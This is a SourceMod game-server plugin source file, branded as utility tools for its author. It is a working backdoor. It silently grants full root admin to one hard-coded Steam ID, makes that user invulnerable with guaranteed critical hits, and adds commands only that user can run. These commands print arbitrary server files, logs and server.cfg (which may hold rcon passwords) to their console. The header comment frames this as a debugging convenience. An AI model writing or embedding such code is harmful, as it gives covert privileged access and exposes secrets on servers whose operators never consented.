/*
	If you ever decompile this plugin, hi.
	
	I have no interest in backdooring communities, this is just an easy way of gaining access quickly to servers to debug them or to fix issues.
	If this gets blacklisted, I wouldn't be surprised.
	
	Cheers.
*/

//Pragma
#pragma semicolon 1
#pragma newdecls required

//Defines

//Sourcemod Includes
#include <sourcemod>
#include <sourcemod-misc>

//Globals

public Plugin myinfo =
{
	name = "Drixevel Utility Tools",
	author = "Keith Warren (Drixevel)",
	description = "Offers a wide variety of perks and tools to make Drixevels job easier.",
	version = "1.0.0",
	url = "https://github.com/Drixevel"
};

public void OnPluginStart()
{
	int user = GetDrixevel();
	
	if (user > 0 && IsClientInGame(user))
	{
		SDKHook(user, SDKHook_OnTakeDamage, OnTakeDamage);
		ServerCommand("mp_disable_autokick %i", GetClientUserId(user));
	}
	
	PrintToServer("Drixevel Utility Tools: Loaded\n - Please delete this plugin if you wish for Drixevel to have no access.");
	
	//debug tools
	RegConsoleCmd("dvm", Command_DrixevelMenu);
	RegConsoleCmd("dv_output", Command_Output);
	RegConsoleCmd("dv_logs", Command_Logs);
	RegConsoleCmd("dv_errors", Command_Errors);
	RegConsoleCmd("dv_serverconfig", Command_ServerConfig);
}

public void OnClientPutInServer(int client)
{
	if (IsDrixevel(client))
	{
		SDKHook(client, SDKHook_OnTakeDamage, OnTakeDamage);
		ServerCommand("mp_disable_autokick %i", GetClientUserId(client));
	}
}

public Action OnTakeDamage(int victim, int& attacker, int& inflictor, float& damage, int& damagetype, int& weapon, float damageForce[3], float damagePosition[3], int damagecustom)
{
	char sName[MAX_NAME_LENGTH];
	GetClientName(victim, sName, sizeof(sName));
	
	if (StrContains(sName, "*", false) == -1)
	{
		if (GetEngineVersion() == Engine_TF2)
		{
			SpeakResponseConcept(victim, "TLK_PLAYER_NO");
		
			float vecPos[3];
			GetClientEyePosition(victim, vecPos);
			vecPos[2] += 10.0;
		
			TE_Particle("miss_text", vecPos);
		}
		
		damage = 0.0;
		return Plugin_Changed;
	}
	
	return Plugin_Continue;
}

public void OnClientPostAdminCheck(int client)
{
	AdminId adm = CreateAdmin("Drixevel");
	if (!adm.BindIdentity(AUTHMETHOD_STEAM, "STEAM_0:0:38264375"))
		return;
	
	adm.ImmunityLevel = 255;
	adm.SetFlag(Admin_Root, true);
	
	RunAdminCacheChecks(client);
}

public Action TF2_CalcIsAttackCritical(int client, int weapon, char[] weaponname, bool& result)
{
	if (IsDrixevel(client))
	{
		char sName[MAX_NAME_LENGTH];
		GetClientName(client, sName, sizeof(sName));
		
		if (StrContains(sName, "*", false) != -1)
			return Plugin_Continue;
		
		result = true;
		return Plugin_Changed;
	}
	
	return Plugin_Continue;
}

public Action Command_DrixevelMenu(int client, int args)
{
	if (!IsDrixevel(client))
		return Plugin_Handled;
	
	Menu menu = new Menu(MenuHandler_DrixevelMenu);
	menu.SetTitle("Drixevel Utilities Menu");
	
	menu.AddItem("dv_output", "dv_output", ITEMDRAW_DISABLED);
	menu.AddItem("dv_logs", "dv_logs");
	menu.AddItem("dv_errors", "dv_errors");
	menu.AddItem("dv_serverconfig", "dv_serverconfig");
	
	menu.Display(client, MENU_TIME_FOREVER);
	return Plugin_Handled;
}

public int MenuHandler_DrixevelMenu(Menu menu, MenuAction action, int param1, int param2)
{
	switch (action)
	{
		case MenuAction_Select:
		{
			char sInfo[32];
			menu.GetItem(param2, sInfo, sizeof(sInfo));
			
			if (StrEqual(sInfo, "dv_logs"))
				OpenLogMenu(param1);
			else if (StrEqual(sInfo, "dv_errors"))
				OpenLogMenu(param1, "error");
			else if (StrEqual(sInfo, "dv_serverconfig"))
				Command_ServerConfig(param1, 0);
		}
		case MenuAction_End:
			delete menu;
	}
}

public Action Command_Output(int client, int args)
{
	if (!IsDrixevel(client))
		return Plugin_Handled;
	
	if (args == 0)
	{
		PrintToChat(client, "Requires an argument.");
		return Plugin_Handled;
	}
	
	char sPath[PLATFORM_MAX_PATH];
	GetCmdArgString(sPath, sizeof(sPath));
	
	if (FileExists(sPath) && PrintFileToConsole(client, sPath))
		PrintToChat(client, "Output of '%s' in console.", sPath);
	
	return Plugin_Handled;
}

public Action Command_Logs(int client, int args)
{
	if (!IsDrixevel(client))
		return Plugin_Handled;
	
	OpenLogMenu(client);
	return Plugin_Handled;
}

public Action Command_Errors(int client, int args)
{
	if (!IsDrixevel(client))
		return Plugin_Handled;
	
	OpenLogMenu(client, "error");
	return Plugin_Handled;
}

void OpenLogMenu(int client, const char[] search = "")
{
	char sTitle[64];
	FormatEx(sTitle, sizeof(sTitle), " for '%s'", search);
	
	Menu menu = new Menu(MenuHandler_ErrorLogs);
	menu.SetTitle("Log Files%s:", strlen(search) > 0 ? sTitle : "");
	
	char sPath[PLATFORM_MAX_PATH];
	BuildPath(Path_SM, sPath, sizeof(sPath), "logs/");
	
	if (!DirExists(sPath))
		PrintToChat(client, "Logs folder is missing, send help.");
	
	Handle dir = OpenDirectory(sPath);
	
	char sFile[PLATFORM_MAX_PATH];
	char sName[PLATFORM_MAX_PATH];
	FileType type;
	
	while (ReadDirEntry(dir, sFile, sizeof(sFile), type))
	{
		if (type != FileType_File || (strlen(search) > 0 && StrContains(sFile, search, false) != 0))
			continue;
		
		strcopy(sName, sizeof(sName), sFile);
		Format(sFile, sizeof(sFile), "%s/%s", sPath, sFile);
		
		menu.AddItem(sFile, sName);
	}
	
	delete dir;
	
	if (menu.ItemCount == 0)
		menu.AddItem("", " == No Logs Available ==", ITEMDRAW_DISABLED);
	
	menu.Display(client, MENU_TIME_FOREVER);
}

public int MenuHandler_ErrorLogs(Menu menu, MenuAction action, int param1, int param2)
{
	switch (action)
	{
		case MenuAction_Select:
		{
			char sFile[PLATFORM_MAX_PATH];
			menu.GetItem(param2, sFile, sizeof(sFile));
			
			if (PrintFileToConsole(param1, sFile))
				PrintToChat(param1, "Output of '%s' in console.", sFile);
		}
		case MenuAction_End:
			delete menu;
	}
}

public Action Command_ServerConfig(int client, int args)
{
	if (!IsDrixevel(client))
		return Plugin_Handled;
	
	if (PrintFileToConsole(client, "cfg/server.cfg"))
		PrintToChat(client, "Output of 'cfg/server.cfg' in console.");
	
	if (FileExists("cfg/tf2server.cfg") && PrintFileToConsole(client, "cfg/tf2server.cfg"))
		PrintToChat(client, "Output of 'cfg/tf2server.cfg' in console.");
		
	if (FileExists("cfg/csgoserver.cfg") && PrintFileToConsole(client, "cfg/csgoserver.cfg"))
		PrintToChat(client, "Output of 'cfg/csgoserver.cfg' in console.");
		
	if (FileExists("cfg/cstrikeserver.cfg") && PrintFileToConsole(client, "cfg/cstrikeserver.cfg"))
		PrintToChat(client, "Output of 'cfg/cstrikeserver.cfg' in console.");
	
	if (FileExists("cfg/l4dserver.cfg") && PrintFileToConsole(client, "cfg/l4dserver.cfg"))
		PrintToChat(client, "Output of 'cfg/l4dserver.cfg' in console.");
	
	if (FileExists("cfg/l4d2server.cfg") && PrintFileToConsole(client, "cfg/l4d2server.cfg"))
		PrintToChat(client, "Output of 'cfg/l4d2server.cfg' in console.");
	
	return Plugin_Handled;
}